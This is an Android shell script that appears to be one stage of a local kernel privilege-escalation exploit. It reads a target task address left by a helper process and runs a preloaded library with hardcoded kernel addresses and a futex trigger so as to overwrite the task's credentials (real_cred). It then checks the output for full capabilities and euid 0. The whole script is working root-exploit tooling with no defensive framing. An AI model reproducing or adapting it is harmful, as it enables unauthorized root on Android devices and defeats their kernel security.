#!/system/bin/sh
# R-stage external-mode isolation test (mt70 + run_holder.sh).
#
# Prerequisite: run termux/run_holder.sh first to create a live clean target.
# This script reads that task from mt49_child_status.txt and runs stage=R with
# PSELECT_TASK=<task> (external mode). It writes real_cred (task+0x778).
#
# If external mode works: status CapEff becomes 000001ffffffffff, euid stays 2000.
# If external mode is the C 0/6 root cause: status remains CapEff=0 euid=2000.
LOG=/data/local/tmp/rext_log.txt
echo "=== REXT start $(date +%H:%M:%S) ===" > $LOG
TASK=$(cat /data/local/tmp/mt49_child_status.txt 2>/dev/null | grep '^task=' | head -1 | cut -d= -f2 | cut -d' ' -f1)
if [ -z "$TASK" ]; then
  echo "!! no task in mt49_child_status.txt - run run_holder.sh first" >> $LOG
  cat $LOG
  exit 1
fi
echo "TASK=$TASK" >> $LOG
am kill-all 2>/dev/null
# External mode: do NOT clear status; we need the live child telemetry.
rm -f /data/local/tmp/root_alive.txt
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 PSELECT_TASK=$TASK \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
  > /data/local/tmp/Rext.out 2>&1
echo "REXT rc=$? boot=$(cat /proc/sys/kernel/random/boot_id) enforce=$(getenforce)" >> $LOG
echo "--- status ---" >> $LOG
cat /data/local/tmp/mt49_child_status.txt 2>/dev/null >> $LOG
echo "--- markers ---" >> $LOG
grep -a "mt49: external\|mt48: PTR stage\|mt25: futex trigger\|mt19b\|pselect returned\|CapEff=000001ffffffffff\|euid=0\|root_seen=" /data/local/tmp/Rext.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -30 >> $LOG
cat $LOG
